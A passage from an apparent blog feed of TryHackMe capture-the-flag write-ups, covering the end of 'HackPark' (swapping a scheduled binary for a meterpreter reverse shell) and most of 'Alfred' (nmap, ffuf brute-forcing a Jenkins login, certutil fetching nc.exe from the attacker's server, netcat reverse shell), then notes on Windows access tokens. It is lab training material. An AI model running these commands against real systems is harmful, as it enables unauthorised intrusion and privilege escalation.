&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Replacing the W3Scheduler.exe with a backdoor would not work since it is a virtual box and once
rebooted, it will reset itself to factory settings. That is why we need to dig further to find out how
to walk around this.
&lt;br /&gt;&lt;br /&gt;There is a log file in the directory, let’s see what is inside.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
The scheduler executes a binary called Messages.exe every 23 seconds. 
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
This binary in the modifiable directory too. If we create a 
backdoor and put it where Message.exe sits, we can escalate our privileges.
&lt;br /&gt;&lt;br /&gt;Once again, let us create a meterpreter reverse shell binary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;msfvenom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86/shikata_ga_nai&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revshell.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Then start the python server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Start the multi handler listener.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
Then, replace the real binary with the malicious backdoor.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Sit back and wait for the session to initialize.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Voilà! We are the administrator now.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 31 Dec 2021 18:20:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>metasploit</category>
        
        <category>mindows-privesc</category>
        
        <category>bruteforce</category>
        
        <category>remote-code-execution</category>
        
        <category>directory-traversal</category>
        
        <category>autorun-privesc</category>
        
        
      </item>
    
      <item>
        <title>THM Alfred CTF Writeup</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://www.tryhackme.com/room/alfred&quot;&gt;&lt;strong&gt;Solve Yourself »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;ENUMERATION&lt;/h1&gt;

&lt;p&gt;Run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) on Alfred machine to discover opened ports and services.&lt;/p&gt;

&lt;p&gt;Full command :&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;machine IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;outputfile&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SYN, half TCP scan&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Skip host discovery&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Write output to a file&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Output of the scan:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.195.99
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.030s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 SP1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 Update 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 R1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 or Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 or 2008 Beta 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Three ports are opened:&lt;/p&gt;
&lt;h2 id=&quot;port-80-http-microsoft-iis-httpd-75&quot;&gt;Port 80 http Microsoft IIS httpd 7.5&lt;/h2&gt;
&lt;p&gt;Ordinary &lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Information_Services&quot;&gt;&lt;strong&gt;Microsoft IIS&lt;/strong&gt;&lt;/a&gt; web server.
&lt;br /&gt;Nothing fancy here.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;port-3389-tcpwrapped&quot;&gt;Port 3389 tcpwrapped&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;tcpwrapped&lt;/strong&gt; means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
&lt;br /&gt;&lt;a href=&quot;https://secwiki.org/w/FAQ_tcpwrapped&quot;&gt;&lt;strong&gt;More information here&lt;/strong&gt;.&lt;/a&gt;
&lt;br /&gt;However, port 3389 typically used for &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol&quot;&gt;RDP&lt;/a&gt; protocol.&lt;/p&gt;

&lt;h2 id=&quot;port-8080-jetty-94z-snapshot&quot;&gt;Port 8080 Jetty 9.4.z-SNAPSHOT&lt;/h2&gt;

&lt;p&gt;There is a &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-jenkins/&quot;&gt;&lt;strong&gt;Jenkins&lt;/strong&gt;&lt;/a&gt; login prompt on port 8080.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
If you google it, you will see the default login credentials for Jenkins is &lt;strong&gt;admin&lt;/strong&gt; for the username and &lt;strong&gt;admin&lt;/strong&gt; for the password.
However, the system administrator could have changed the password to a different one. In that case default credentials
would be useless. So we will brute force the credentials for best practice.&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;EXPLOITATION&lt;/h1&gt;

&lt;p&gt;In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-burp-suite/&quot;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; to examine the HTTP POST request sent 
when a login attempt occurs.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Request&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4&quot;&gt;&lt;strong&gt;application/x-www-form-urlencoded&lt;/strong&gt;&lt;/a&gt; : Encoding type&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;j_username&lt;/strong&gt; : Username field&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;j_password&lt;/strong&gt; : Password Field&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I will use &lt;a href=&quot;https://cybersecnerds.com/ffuf-everything-you-need-to-know/&quot;&gt;&lt;strong&gt;ffuf&lt;/strong&gt;&lt;/a&gt; to create POST requests toward the web server.
You can use any fuzzer tool like &lt;strong&gt;THC Hydra&lt;/strong&gt;, &lt;strong&gt;Burp Suite&lt;/strong&gt; or others. 
&lt;br /&gt;Download &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;strong&gt;SecLists&lt;/strong&gt;&lt;/a&gt; repo with prepeared wordlists included.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Dedicated wordlists&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-u&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Target URL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-data&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Data which will be sent with the request&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-H&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP headers that will be sent with the request&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-fr&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Regex which will be filtered out&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Full command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.56.186:8080/j_acegi_security_check&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;j_username=W1&amp;amp;j_password=W2&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;loginError&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;Cracked the credentials, well done :)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;
A possible question would be, why filter out “loginError” string ? 
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Left: Request - Right:Response&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
That sent request got a response with &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302&quot;&gt;&lt;strong&gt;HTTP 302 status code&lt;/strong&gt;&lt;/a&gt;, which is the status code for redirection.
It means whenever the application receives invalid credentials from the client; the server redirects the client to the “/loginError” URL.
Based on this, as long as the HTTP response does not include “/loginError” in it, it is safe to say we have sent a valid username-password pair
to the server.
&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;Login to the Jenkins panel via credentials.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
system, it would be amazing.&lt;br /&gt;&lt;br /&gt;
The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.&lt;br /&gt;
Click on the first project named as &lt;strong&gt;project&lt;/strong&gt;, then click &lt;strong&gt;configure&lt;/strong&gt;.
Scroll down to the bottom, and you will see a box that executes the windows command written in it.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
On the project page, there is a &lt;strong&gt;Build History&lt;/strong&gt; section. It is available to check the output of the batch command that had run.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png&quot; alt=&quot;&quot; /&gt;
Now, instead of printing the string value of the user who executes it with the &lt;strong&gt;whoami&lt;/strong&gt; command, we have to connect to that shell.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;I will use &lt;a href=&quot;https://www.ionos.com/digitalguide/server/tools/netcat/&quot;&gt;&lt;strong&gt;Netcat&lt;/strong&gt;&lt;/a&gt; in this manner. It is required to have Netcat downloaded in both the attacker and the
victim machine.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Download static &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;nc.exe&lt;/strong&gt;&lt;/a&gt; binary for to run it in the victim machine&lt;/li&gt;
  &lt;li&gt;Start a Python3 server in the directory that includes the Netcat static binary file.
&lt;br /&gt;Run:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Start a Netcat listener in the attacker machine.
&lt;br /&gt;Run:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ANY FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Download the static binary to the victim machine from the Python web server and run it.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/nc.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Click &lt;strong&gt;Build&lt;/strong&gt; button on the project page.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A get request was made to the web server.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png&quot; alt=&quot;&quot; /&gt;
Then we got the shell.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;We are in, nice progress ;)&lt;/strong&gt;
To get user flag, run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;kr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Bruce\Desktop\user.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;windows-tokens&quot;&gt;WINDOWS TOKENS&lt;/h1&gt;
&lt;p&gt;This machine focuses on the Windows access tokens and escalate privileges with them.&lt;/p&gt;

&lt;h2 id=&quot;what-is-an-access-token-&quot;&gt;What is an access token ?&lt;/h2&gt;

&lt;p&gt;An access token consists of:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Privileges&lt;/li&gt;
  &lt;li&gt;Group SIDs(security identifier)&lt;/li&gt;
  &lt;li&gt;User SIDs
amongst other things.
&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens&quot;&gt;&lt;strong&gt;Much more detailed information here.&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;An &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly&quot;&gt;access token&lt;/a&gt; contains the security 
information for a logon session. The system creates an access token when a user logs on, and every process 
executed on behalf of the user has a copy of the token. The token identifies the user, the user’s groups, 
and the user’s privileges. The system uses the token to control access to securable objects and to control 
the ability of the user to perform various system-related operations on the local computer. 
There are two kinds of access token, &lt;strong&gt;primary&lt;/strong&gt; and &lt;strong&gt;impersonation&lt;/strong&gt;.
&lt;br /&gt;&lt;br /&gt;There are two types access tokens, according to &lt;a href=&quot;https://docs.microsoft.com/en-us/&quot;&gt;&lt;strong&gt;Windows Docs&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly&quot;&gt;Primary tokens&lt;/a&gt;: An access token that is typically created 
only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly&quot;&gt;Impersonation tokens&lt;/a&gt;: An access token that has been created 
to capture the security information of a client process, allowing a server to “impersonate” the client 
process in security operations. It becomes convenient when you are the local admin on a system and want to
impersonate another logged on client, e.g. a domain admin.
&lt;br /&gt;&lt;br /&gt;There are four levels for impersonation token:
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;SecurityAnonymous&lt;/strong&gt;: current user/account/client cannot impersonate another user/account/client.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;SecurityIdentification&lt;/strong&gt;: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;SecurityImpersonation&lt;/strong&gt;: current user/account/client can impersonate user’s security context on the local system.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;SecurityDelegation&lt;/strong&gt;: current user/account/client can impersonate user’s security context on a remote system.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The security context is a data structure that stores clients’ security information.&lt;/p&gt;

&lt;h3 id=&quot;diffrence-between-proceesses-hierarchy-in-unix-and-windows&quot;&gt;Diffrence between proceesses hierarchy in UNIX and Windows&lt;/h3&gt;
&lt;h3 id=&quot;unix&quot;&gt;unix&lt;/h3&gt;
&lt;p&gt;In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
inherits all the permissions from its’ parent. If the parent dies, the child becomes an &lt;a href=&quot;https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/&quot;&gt;orphan or zombie process&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;windows&quot;&gt;windows&lt;/h3&gt;

&lt;p&gt;The parent-child relationship does not exist for the Windows environment. 
However, I will refer to them as parent-child to facilitate the explanation.
Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
